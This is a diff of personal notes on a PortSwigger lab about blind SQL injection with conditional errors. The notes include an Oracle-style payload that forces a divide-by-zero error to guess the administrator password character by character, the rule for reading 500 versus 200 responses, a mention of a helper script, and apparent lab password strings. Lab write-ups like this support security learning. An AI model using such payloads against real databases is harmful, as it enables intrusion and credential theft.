@@ -112,9 +112,15 @@ https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
 5) Output the administrator password
 
 ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,,1)='a') || ' 
--> w is not the first character of the password
 
-wjuc497wl6szhbtf0cbf
+-> a is not the first character of the password
+
+500 response indicate perfect match of character at the position
+200 indicates not
+
+-> i use her python script as i have no prof edition of burp
 
 
 script.py <url>
+
+jfgwq7zxnao8eox541yy
